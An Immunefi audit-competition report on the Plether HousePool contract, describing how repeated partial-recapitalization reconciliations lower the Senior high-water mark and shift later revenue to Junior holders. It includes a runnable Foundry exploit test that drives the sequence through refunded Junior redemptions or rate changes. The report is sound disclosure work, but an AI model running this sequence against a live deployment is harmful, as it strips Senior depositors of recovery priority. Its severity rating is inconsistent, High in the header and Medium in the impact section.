# \#99794 [SC-High] Repeated partial-recapitalization reconciliation diverts Senior recovery to Junior

**Submitted on Nov 15th 2026 at 09:43:41 UTC by @jsmaxi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99794
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a trader claim reserves part of an owner-funded recapitalization, repeated LP reconciliations can reduce `seniorHighWaterMark` without a new loss. The lower mark lets later trading revenue accrue to Junior before it has restored Senior's impaired principal.

## Vulnerability Details

The pool caps pending recapitalization against current distributable assets. It then subtracts the capped amount before comparing distributable assets with stored tranche principal. This works on the first reconcile, but a second reconcile can reserve the same net assets again while the principal credited by the first pass is already in storage.

Consider a pool with surviving Senior and Junior shares, zero tranche principal after a wipe, a Senior high-water mark of 100, and an outstanding trader claim of 60. The owner uses `CfdEngine.recapitalizePool` to add 100. With no open positions or terminal price delta, distributable assets are 40. The accounting progresses as follows:

| Reconcile | Senior principal | Senior high-water mark | Pending recapitalization |
| --- | ---: | ---: | ---: |
| First | 40 | 100 | 60 |
| Second, with unchanged net assets | 40 | 60 | 20 |
| Third, with unchanged net assets | 40 | 60 | 0 |

On the second pass, `planReconcile` reserves 40 from the same 40 distributable assets, then treats the booked Senior principal as a 40 loss. `absorbLoss` correctly leaves the high-water mark at 100. The pending-recapitalization helper then sees zero principal and treats the next 40 as a fresh bootstrap. It replaces the mark with `max(40, 60)`, or 60. The third pass clears the remaining pending amount without restoring the mark. Paying the trader claim before or after these passes does not change net distributable assets, since pool cash and claim liabilities fall by the same amount.

The helper describes `recapitalizationTargetAssets` as the "Full recapitalization intent used as the high-water mark on an empty bootstrap" in its [parameter comment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L110). On the second pass, the caller supplies the smaller residual pending bucket as that target. The helper has no record of the original intent or of the Senior shares whose recovery rights the first pass preserved.

The accounting specification says losses do not reduce the Senior high-water mark. This sequence lowers it even though no new loss occurs between reconciliations.

No Senior withdrawal is funded in this sequence. The faulty transition is repeated partial-recapitalization reconciliation, separate from high-water-mark scaling during a subset redemption.

An ordinary Senior depositor loses recovery priority, while a holder of unlocked Junior shares can commit these passes through LP epoch settlement. With no open positions, settlement is permissionless. The Junior holder can request redemption of their full balance even when Junior NAV is zero. The matured request receives a refund, but the refund counts as processed epoch work, so `settleLpEpoch` keeps the reconciliation. The holder can reclaim the shares, wait through the one-hour cooldown, and submit another request for a later epoch. If the preceding wipe latched degraded mode, the owner can use the documented recovery path to clear it after the recapitalization covers the remaining liability.

The same accounting error also occurs without a zero-value refund. A legitimate Senior coupon-rate change, proposed through the 72-hour governance delay, calls `_reconcile` when finalized with a fresh mark. Two successive rate finalizations after the recapitalization commit the first and second partial reconciliations. With Junior principal at zero, neither coupon checkpoint transfers value; the second finalization lowers the high-water mark despite unchanged pool equity and no intervening LP redemption. This is an independent trigger for the incomplete recapitalization fix, although it requires two ordinary owner actions.

The prior MED-24 finding accepted that zero-value refunds consume bounded epoch work and can delay later redemptions. Here the refund provides settlement progress. The loss of Senior recovery priority comes from each retained reconciliation reusing the same distributable assets and replacing the high-water mark. At the modeled snapshot, the claim and pending recap leave no cash to fund a Senior redemption, so the test uses a refundable Junior request to commit each pass.

## Impact Details

Once the pending recapitalization is exhausted, 60 of later revenue should restore Senior principal from 40 to its 100 high-water mark. With the reduced mark, only 20 goes to Senior and 40 is allocated to Junior. Junior owners can redeem allocated value subject to the normal withdrawal limits. The error also understates protected Senior exposure in capacity checks. The loss of recovery priority depends on later revenue, so Medium is the conservative severity.

The earlier partial-bucket fix capped one reconcile and retained residual pending amounts. A later fix addressed revenue routing when recapitalization and revenue settle in the same batch. Neither prevents a repeated partial reconcile from replacing the preserved recovery mark with the smaller outstanding recapitalization amount.

## References

- [HousePool reconciliation and pending-bucket application](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1549-L1598)
- [Senior rate finalization calls reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L327-L342)
- [Reconciliation planner](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L104)
- [Recapitalization intent helper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137)
- [Zero-value redemption refund path](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L986)
- [Prior zero-value refund finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Senior recovery rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L330-L345)
- [Earlier partial-bucket fix](https://github.com/Plether-Fi/plether-core/pull/29) and [same-batch revenue fix](https://github.com/Plether-Fi/plether-core/pull/122)


## Proof of Concept

## Proof of Concept

The embedded `RecapitalizationRecoveryLifecycle.t.sol` test `test_RepeatedRefundEpochsLowerRecapitalizationRecoveryMark` adds an ordinary Senior depositor alongside the seed holder. It uses ordinary Router executions, LP redemption, and owner recapitalization to create an unpaid trader claim and wipe both tranche principals. The depositor's shares survive the wipe. Three matured Junior redemption requests have zero NAV and are refunded, yet each commits a reconciliation. The test shows that the depositor's share of the Senior high-water mark falls on the second pass without a new loss, then realizes trading revenue and confirms that Junior receives and withdraws value before the original Senior recovery mark is reached.

The same test file includes `test_TwoRateFinalizationsLowerHwmWithoutRefundWork`, which commits both partial reconciliations through scheduled Senior rate changes instead of zero-value refund work. It asserts that the second finalization reduces the high-water mark and the ordinary Senior depositor's recovery priority while Senior principal and the pending recapitalization arithmetic follow the same trace. Both rate changes use the ordinary 72-hour delay and a fresh signed mark.

The claim setup uses a basket price move from 1.00 to 0.40 and then 1.60. This is severe FX market stress and one way to reach a wiped pool with an outstanding trader claim. The accounting error requires that state, surviving Senior shares, a partial recapitalization with a pending remainder, and later reconciliations. The repository's test fixture uses two equal-weight mocked feeds and 1,000 USDG tranche seeds rather than the release's six weighted feeds and 1 USDG seeds. The waterfall receives the resulting basket mark rather than individual feed values. These tests establish the accounting transition under valid contract calls, but not how likely the stress path is for the release basket.

On a fresh checkout of the pinned commit, save the patch below as `recap-reconcile.patch` in the repository root and run:

```sh
git submodule update --init --recursive
git apply --check recap-reconcile.patch
git apply recap-reconcile.patch
forge test --root packages/perps --match-path test/perps/accounting/waterfall/RecapitalizationRecoveryLifecycle.t.sol -vv
```

### Complete runnable PoC patch

```diff
diff --git a/packages/perps/test/perps/accounting/waterfall/RecapitalizationRecoveryLifecycle.t.sol b/packages/perps/test/perps/accounting/waterfall/RecapitalizationRecoveryLifecycle.t.sol
new file mode 100644
index 00000000..f0f974c6
--- /dev/null
+++ b/packages/perps/test/perps/accounting/waterfall/RecapitalizationRecoveryLifecycle.t.sol
@@ -0,0 +1,314 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {OrderRouterPythTestBase} from "../../shared/OrderRouterTestBase.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+
+contract RecapitalizationRecoveryLifecycleTest is OrderRouterPythTestBase {
+
+    uint256 private constant ENTRY_PRICE = 100_000_000;
+    uint256 private constant LOW_PRICE = 40_000_000;
+    uint256 private constant HIGH_PRICE = 160_000_000;
+    uint256 private constant FIRST_SIZE = 400_000e18;
+    uint256 private constant SECOND_SIZE = 200_000e18;
+    uint256 private constant TOTAL_SIZE = FIRST_SIZE + SECOND_SIZE;
+    address private constant SENIOR_LP = address(0xCA402);
+
+    function test_RepeatedRefundEpochsLowerRecapitalizationRecoveryMark() public {
+        // The 0.40 to 1.60 basket path is a severe market stress setup. It creates a genuine
+        // deferred trader payout without altering Pool balances or contract storage directly.
+        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN() + 1);
+        _setSeniorCapacity(40_000_000e6, 8000);
+        CfdTypes.RiskParams memory releaseRisk = _riskParams();
+        releaseRisk.vpiFactor = 0.01e18;
+        releaseRisk.maintMarginBps = 10;
+        releaseRisk.initMarginBps = 20;
+        _setRiskParams(releaseRisk);
+        assertEq(pool.maxSeniorShareBps(), 8000);
+        _refreshMark(ENTRY_PRICE);
+        _fundSenior(SENIOR_LP, 1000e6);
+        uint256 seniorLpShares = seniorVault.balanceOf(SENIOR_LP);
+        assertGt(seniorLpShares, 0, "An ordinary Senior depositor must own recovery rights");
+
+        uint256 deficit = _createTraderClaimThroughOrders();
+        assertGt(deficit, 0, "Trading must create a real terminal LP deficit");
+        assertEq(seniorVault.balanceOf(SENIOR_LP), seniorLpShares, "The Senior depositor survives the wipe");
+
+        uint256 recap = deficit + (deficit * 2) / 3;
+        uint256 settleable = recap - deficit;
+        settlementToken.mint(address(this), recap);
+        settlementToken.approve(address(engine), recap);
+        engine.recapitalizePool(recap);
+        if (engine.degradedMode()) {
+            engine.clearDegradedMode();
+        }
+        assertEq(pool.totalAssets() - engine.totalTraderClaimBalanceAssets(), settleable);
+        assertEq(pool.pendingRecapitalizationAssets(), recap);
+
+        uint256 firstEpoch = _settleZeroValueJuniorRedeem();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.juniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), recap);
+        assertEq(pool.pendingRecapitalizationAssets(), deficit);
+        _claimRefund(firstEpoch);
+
+        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
+        uint256 secondEpoch = _settleZeroValueJuniorRedeem();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.juniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), deficit, "A repeat pass lowers the recovery mark without a new loss");
+        assertLt(pool.seniorHighWaterMark(), recap);
+        assertGt(
+            (recap * seniorLpShares) / seniorVault.totalSupply(),
+            (pool.seniorHighWaterMark() * seniorLpShares) / seniorVault.totalSupply(),
+            "The ordinary Senior depositor loses priority over future revenue"
+        );
+        assertEq(pool.pendingRecapitalizationAssets(), deficit - settleable);
+        _claimRefund(secondEpoch);
+
+        vm.prank(bob);
+        engine.settleTraderClaim(bob);
+        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
+        assertEq(pool.totalAssets(), settleable, "Claim payment leaves net pool equity unchanged");
+
+        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
+        uint256 thirdEpoch = _settleZeroValueJuniorRedeem();
+        assertEq(pool.pendingRecapitalizationAssets(), 0);
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.seniorHighWaterMark(), deficit);
+        _claimRefund(thirdEpoch);
+
+        _realizeTradingRevenue();
+        (uint256 projectedSenior, uint256 projectedJunior,,) = pool.getPendingTrancheState();
+        assertEq(projectedSenior, deficit, "Revenue fills only the lowered Senior recovery mark");
+        assertGt(projectedJunior, 0, "The remaining revenue is assigned to Junior shares");
+        assertLt(projectedSenior + projectedJunior, recap, "Junior receives revenue before the original recovery mark");
+
+        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
+        uint256 redeemShares = juniorVault.estimateWithdrawShares(2e6);
+        vm.prank(bob);
+        uint256 payoutEpoch = juniorVault.requestRedeem(redeemShares, bob, bob);
+        vm.warp(pool.lpEpochStart(payoutEpoch));
+        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
+        assertGt(result.juniorFundedAssets, 0, "Junior allocation must become withdrawable");
+        uint256 claimableShares = juniorVault.claimableRedeemRequest(payoutEpoch, bob);
+        vm.prank(bob);
+        assertGt(juniorVault.claimRedeem(payoutEpoch, claimableShares, bob, bob), 0);
+    }
+
+    function test_RateFinalizationRepeatsPartialRecapWithoutAnotherRedeem() public {
+        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN() + 1);
+        _setSeniorCapacity(40_000_000e6, 8000);
+        CfdTypes.RiskParams memory releaseRisk = _riskParams();
+        releaseRisk.vpiFactor = 0.01e18;
+        releaseRisk.maintMarginBps = 10;
+        releaseRisk.initMarginBps = 20;
+        _setRiskParams(releaseRisk);
+        _refreshMark(ENTRY_PRICE);
+        _fundSenior(SENIOR_LP, 1000e6);
+        assertGt(seniorVault.balanceOf(SENIOR_LP), 0);
+
+        uint256 deficit = _createTraderClaimThroughOrders();
+        uint256 recap = deficit + (deficit * 2) / 3;
+        uint256 settleable = recap - deficit;
+        settlementToken.mint(address(this), recap);
+        settlementToken.approve(address(engine), recap);
+        engine.recapitalizePool(recap);
+        if (engine.degradedMode()) {
+            engine.clearDegradedMode();
+        }
+
+        uint256 firstEpoch = _settleZeroValueJuniorRedeem();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.seniorHighWaterMark(), recap);
+        assertEq(pool.pendingRecapitalizationAssets(), deficit);
+        _claimRefund(firstEpoch);
+
+        IHousePool.PoolConfig memory nextConfig = _currentPoolConfig();
+        nextConfig.seniorRateBps += 1;
+        pool.proposePoolConfig(nextConfig);
+        vm.warp(pool.poolConfigActivationTime());
+        _refreshMark(ENTRY_PRICE);
+        assertEq(pool.seniorHighWaterMark(), recap, "Mark refresh did not reconcile the pool");
+        assertEq(pool.pendingRecapitalizationAssets(), deficit);
+
+        // A legitimate rate finalization is the second retained reconcile. No new LP request or refund occurs.
+        pool.finalizePoolConfig();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.seniorHighWaterMark(), deficit, "Rate finalization lowered HWM without a new loss");
+        assertEq(pool.pendingRecapitalizationAssets(), deficit - settleable);
+    }
+
+    function test_TwoRateFinalizationsLowerHwmWithoutRefundWork() public {
+        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN() + 1);
+        _setSeniorCapacity(40_000_000e6, 8000);
+        CfdTypes.RiskParams memory releaseRisk = _riskParams();
+        releaseRisk.vpiFactor = 0.01e18;
+        releaseRisk.maintMarginBps = 10;
+        releaseRisk.initMarginBps = 20;
+        _setRiskParams(releaseRisk);
+        _refreshMark(ENTRY_PRICE);
+        _fundSenior(SENIOR_LP, 1000e6);
+        uint256 seniorLpShares = seniorVault.balanceOf(SENIOR_LP);
+        assertGt(seniorLpShares, 0);
+
+        uint256 deficit = _createTraderClaimThroughOrders();
+        uint256 recap = deficit + (deficit * 2) / 3;
+        uint256 settleable = recap - deficit;
+        settlementToken.mint(address(this), recap);
+        settlementToken.approve(address(engine), recap);
+        engine.recapitalizePool(recap);
+        if (engine.degradedMode()) {
+            engine.clearDegradedMode();
+        }
+
+        IHousePool.PoolConfig memory firstConfig = _currentPoolConfig();
+        firstConfig.seniorRateBps += 1;
+        pool.proposePoolConfig(firstConfig);
+        vm.warp(pool.poolConfigActivationTime());
+        _refreshMark(ENTRY_PRICE);
+        pool.finalizePoolConfig();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.seniorHighWaterMark(), recap);
+        assertEq(pool.pendingRecapitalizationAssets(), deficit);
+        uint256 distributableBeforeSecond = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
+
+        IHousePool.PoolConfig memory secondConfig = _currentPoolConfig();
+        secondConfig.seniorRateBps += 1;
+        pool.proposePoolConfig(secondConfig);
+        vm.warp(pool.poolConfigActivationTime());
+        _refreshMark(ENTRY_PRICE);
+        pool.finalizePoolConfig();
+        assertEq(pool.seniorPrincipal(), settleable);
+        assertEq(pool.seniorHighWaterMark(), deficit, "Two ordinary rate finalizations lowered HWM");
+        assertGt(
+            (recap * seniorLpShares) / seniorVault.totalSupply(),
+            (pool.seniorHighWaterMark() * seniorLpShares) / seniorVault.totalSupply(),
+            "The ordinary Senior depositor loses priority without a redemption"
+        );
+        assertEq(pool.pendingRecapitalizationAssets(), deficit - settleable);
+        assertEq(
+            pool.totalAssets() - engine.totalTraderClaimBalanceAssets(),
+            distributableBeforeSecond,
+            "Distributable value did not change between reconciliations"
+        );
+        assertEq(juniorVault.redeemQueueHead(), 0, "No redemption was pending during these reconciles");
+    }
+
+    function _createTraderClaimThroughOrders() private returns (uint256 deficit) {
+        _fundTrader(alice, 100_000e6);
+        _fundTrader(bob, 100_000e6);
+
+        _commitAndExecute(alice, CfdTypes.Side.LONG, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _commitAndExecute(bob, CfdTypes.Side.SHORT, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _commitAndExecute(alice, CfdTypes.Side.LONG, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+        _commitAndExecute(bob, CfdTypes.Side.SHORT, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), TOTAL_SIZE);
+        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), TOTAL_SIZE);
+
+        uint256 exitShares = juniorVault.estimateWithdrawShares(350_000e6);
+        assertLt(exitShares, juniorVault.balanceOf(bob));
+        vm.prank(bob);
+        uint256 exitEpoch = juniorVault.requestRedeem(exitShares, bob, bob);
+        vm.warp(pool.lpEpochStart(exitEpoch));
+        _warpToLiveMarket();
+        mockPyth.setAllPrices(feedIds, int64(uint64(ENTRY_PRICE)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        router.settleLpEpoch(_pythUpdateData());
+        uint256 fundedShares = juniorVault.claimableRedeemRequest(exitEpoch, bob);
+        assertEq(fundedShares, exitShares, "Normal LP settlement must fund the free-cash redemption");
+        vm.prank(bob);
+        assertGt(juniorVault.claimRedeem(exitEpoch, fundedShares, bob, bob), 0);
+
+        _commitAndExecute(alice, CfdTypes.Side.LONG, TOTAL_SIZE, 0, LOW_PRICE, true);
+        _commitAndExecute(bob, CfdTypes.Side.SHORT, TOTAL_SIZE, 0, HIGH_PRICE, true);
+        (uint256 longSize,,,,,,) = engine.positions(alice);
+        (uint256 shortSize,,,,,,) = engine.positions(bob);
+        assertEq(longSize, 0);
+        assertEq(shortSize, 0);
+
+        uint256 claim = engine.traderClaimBalanceAssets(bob);
+        assertGt(claim, pool.totalAssets(), "Second winner must hold an unpaid claim above remaining Pool cash");
+        deficit = claim - pool.totalAssets();
+        (uint256 projectedSenior, uint256 projectedJunior,,) = pool.getPendingTrancheState();
+        assertEq(projectedSenior, 0, "Both tranches must be economically wiped before recapitalization");
+        assertEq(projectedJunior, 0);
+    }
+
+    function _settleZeroValueJuniorRedeem() private returns (uint256 requestId) {
+        uint256 shares = juniorVault.maxRequestRedeem(bob);
+        assertGt(shares, 0);
+        assertEq(shares, juniorVault.balanceOf(bob));
+        assertEq(juniorVault.estimateRedeemAssets(shares), 0);
+        vm.prank(bob);
+        requestId = juniorVault.requestRedeem(shares, bob, bob);
+        vm.warp(pool.lpEpochStart(requestId));
+        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
+        assertEq(result.juniorProcessedEpochs, 1);
+        assertEq(result.juniorFundedAssets, 0);
+        assertEq(juniorVault.refundableRedeemRequest(requestId, bob), shares);
+    }
+
+    function _claimRefund(
+        uint256 requestId
+    ) private {
+        vm.prank(bob);
+        assertGt(juniorVault.claimRedeemRefund(requestId, bob, bob), 0);
+    }
+
+    function _realizeTradingRevenue() private {
+        address losingTrader = address(0xCA401);
+        _fundTrader(losingTrader, 100_000e6);
+        for (uint256 i; i < 6; ++i) {
+            vm.warp(vm.getBlockTimestamp() + 1);
+            _refreshMark(ENTRY_PRICE);
+            _commitAndExecute(losingTrader, CfdTypes.Side.SHORT, 15_000e18, 20_000e6, ENTRY_PRICE, false);
+            _commitAndExecute(losingTrader, CfdTypes.Side.SHORT, 15_000e18, 0, LOW_PRICE, true);
+        }
+    }
+
+    function _refreshMark(
+        uint256 price
+    ) private {
+        _warpToLiveMarket();
+        mockPyth.setAllPrices(feedIds, int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        router.updateMarkPrice(_pythUpdateData());
+    }
+
+    function _warpToLiveMarket() private {
+        uint256 nextTime = vm.getBlockTimestamp();
+        for (uint256 i; i < 72 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
+            nextTime += 1 hours;
+            vm.warp(nextTime);
+        }
+        assertFalse(engine.isOracleFrozen(), "The next FX live session must be reachable");
+        assertFalse(engine.isFadWindow(), "Oracle-dependent orders require a live session");
+    }
+
+    function _commitAndExecute(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        uint256 price,
+        bool isClose
+    ) private {
+        vm.prank(account);
+        uint64 orderId = router.commitOrder(side, size, margin, isClose ? 0 : ENTRY_PRICE, isClose);
+        vm.warp(vm.getBlockTimestamp() + 6);
+        mockPyth.setAllPrices(feedIds, int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _pythUpdateData());
+        assertEq(result.orderId, orderId, "Router result must match the committed order");
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Order must execute");
+        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Executed));
+        assertNotEq(result.receiptHash, bytes32(0), "Executed order must have a terminal receipt");
+        OrderV3Types.TerminalOutcome memory outcome = router.lifecycleBook().terminalOutcome(orderId);
+        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Executed));
+        assertEq(outcome.receiptHash, result.receiptHash, "Book receipt must match the Router result");
+    }
+
+}
```

